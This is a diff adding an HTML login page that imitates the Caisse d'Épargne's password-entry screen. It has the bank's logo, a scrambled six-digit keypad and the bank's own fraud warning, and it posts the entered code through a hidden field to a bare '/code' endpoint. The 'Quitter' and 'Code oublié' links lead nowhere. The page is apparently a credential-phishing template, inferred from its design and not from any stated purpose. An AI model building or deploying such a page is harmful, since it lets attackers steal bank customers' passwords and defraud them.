@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Code confidentiel - Caisse d'Épargne</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .header {
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #ccc;
+    }
+    .header a {
+      color: #c10000;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .header img { height: 36px; }
+    .header .help {
+      border: 2px solid #c10000;
+      color: #c10000;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      text-align: center;
+      line-height: 26px;
+      font-weight: bold;
+    }
+    .scroll-zone {
+      flex: 1;
+      overflow-y: auto;
+    }
+    .container {
+      padding: 24px 16px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 24px;
+    }
+    .toggle-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .circles {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .circle {
+      width: 14px;
+      height: 14px;
+      border: 2px solid #c10000;
+      border-radius: 50%;
+    }
+    .filled {
+      background-color: #c10000;
+    }
+    .clear-btn {
+      display: none;
+      margin-left: 8px;
+      font-size: 22px;
+      color: #000;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+    .keyboard {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 16px;
+      justify-content: center;
+      max-width: 300px;
+      margin: 0 auto 16px;
+    }
+    .keyboard button {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      font-size: 18px;
+      border: 1px solid #999;
+      background: #fff;
+      cursor: pointer;
+    }
+    .alert-box {
+      background: #fff;
+      border: 1px solid #c10000;
+      padding: 16px;
+      font-size: 14px;
+      color: #333;
+      border-radius: 6px;
+      margin: 24px 16px;
+    }
+    .alert-box strong {
+      display: flex;
+      align-items: center;
+      color: #c10000;
+      margin-bottom: 6px;
+    }
+    .alert-box strong::before {
+      content: "⚠️";
+      display: inline-block;
+      margin-right: 8px;
+      font-size: 18px;
+    }
+    .forgot-code {
+      text-align: center;
+      margin: 10px 0 20px;
+    }
+    .forgot-code a {
+      font-size: 14px;
+      color: #c10000;
+      text-decoration: none;
+    }
+    .floating-zone {
+      background: #fff;
+      padding: 16px;
+      box-shadow: 0 -2px 6px rgba(0, 0, 0, 0.1);
+      border-top: 1px solid #ddd;
+      position: sticky;
+      bottom: 0;
+      width: 100%;
+      z-index: 100;
+    }
+    .buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .btn-valider {
+      padding: 14px;
+      background: #ddd;
+      border: none;
+      color: #999;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: not-allowed;
+      width: 100%;
+    }
+    .btn-valider.active {
+      background: #c10000;
+      color: #fff;
+      cursor: pointer;
+    }
+    .btn-annuler {
+      padding: 14px;
+      border: 1px solid #c10000;
+      background: #fff;
+      color: #c10000;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <a href="#">Quitter</a>
+    <img src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17171235/logo-ce-desktop.jpg?func=bound&w=300&h=78&gravity=auto&optipress=2" alt="Logo">
+    <div class="help">?</div>
+  </div>
+
+  <div class="scroll-zone">
+    <div class="container">
+      <h1>Entrez votre mot de passe</h1>
+
+      <div class="toggle-row">
+        <span>Assistance vocale</span>
+        <label>
+          <input type="checkbox" style="width: 40px; height: 20px;">
+        </label>
+      </div>
+
+      <form method="post" action="/code" id="form">
+        <div class="circles" id="circleDisplay">
+          <div class="circle"></div>
+          <div class="circle"></div>
+          <div class="circle"></div>
+          <div class="circle"></div>
+          <div class="circle"></div>
+          <div class="circle"></div>
+          <button type="button" class="clear-btn" id="clearBtn" onclick="clearLastDigit()">&#x2715;</button>
+        </div>
+
+        <div class="keyboard">
+          <button type="button" onclick="appendDigit('8')">8</button>
+          <button type="button" onclick="appendDigit('4')">4</button>
+          <button type="button" onclick="appendDigit('5')">5</button>
+          <button type="button" onclick="appendDigit('6')">6</button>
+          <button type="button" onclick="appendDigit('0')">0</button>
+          <button type="button" onclick="appendDigit('2')">2</button>
+          <button type="button" onclick="appendDigit('1')">1</button>
+          <button type="button" onclick="appendDigit('3')">3</button>
+          <button type="button" onclick="appendDigit('7')">7</button>
+          <button type="button" onclick="appendDigit('9')">9</button>
+        </div>
+
+        <div class="forgot-code">
+          <a href="#">Code oublié ?</a>
+        </div>
+
+        <div class="alert-box">
+          <strong>SOYEZ VIGILANT !</strong>
+          Des fraudeurs peuvent vous contacter PAR TÉLÉPHONE ou EMAIL en se faisant passer pour votre conseiller, les services fraude ou opposition carte… en affichant parfois même nos numéros de téléphone.
+          Nous ne vous demanderons JAMAIS de COMMUNIQUER les données de votre banque (identifiant, mot de passe, code reçu par sms, code Sécur’Pass…), pour CONFIRMER ou ANNULER une opération (ajout de compte bénéficiaire, virement, paiement par carte, validation Sécur’Pass…).
+        </div>
+
+        <input type="hidden" name="code" id="hiddenCode">
+      </form>
+    </div>
+  </div>
+
+  <div class="floating-zone">
+    <div class="buttons">
+      <button type="button" class="btn-valider" id="validerBtn" disabled onclick="submitForm()">Valider</button>
+      <button type="button" class="btn-annuler" onclick="window.location.href='/'">Annuler</button>
+    </div>
+  </div>
+
+  <script>
+    let code = "";
+
+    function appendDigit(digit) {
+      if (code.length < 6) {
+        code += digit;
+        document.getElementById('hiddenCode').value = code;
+        updateCircles();
+      }
+
+      const btn = document.getElementById('validerBtn');
+      const clearBtn = document.getElementById('clearBtn');
+      if (code.length >= 1) {
+        btn.classList.add('active');
+        btn.disabled = false;
+        clearBtn.style.display = 'inline-block';
+      } else {
+        btn.classList.remove('active');
+        btn.disabled = true;
+        clearBtn.style.display = 'none';
+      }
+    }
+
+    function clearLastDigit() {
+      code = code.slice(0, -1);
+      document.getElementById('hiddenCode').value = code;
+      updateCircles();
+
+      const btn = document.getElementById('validerBtn');
+      const clearBtn = document.getElementById('clearBtn');
+      if (code.length >= 1) {
+        btn.classList.add('active');
+        btn.disabled = false;
+        clearBtn.style.display = 'inline-block';
+      } else {
+        btn.classList.remove('active');
+        btn.disabled = true;
+        clearBtn.style.display = 'none';
+      }
+    }
+
+    function updateCircles() {
+      const circles = document.querySelectorAll('.circle');
+      circles.forEach((circle, index) => {
+        if (index < code.length) {
+          circle.classList.add('filled');
+        } else {
+          circle.classList.remove('filled');
+        }
+      });
+    }
+
+    function submitForm() {
+      if (code.length > 0) {
+        document.getElementById('form').submit();
+      }
+    }
+  </script>
+</body>
+</html>
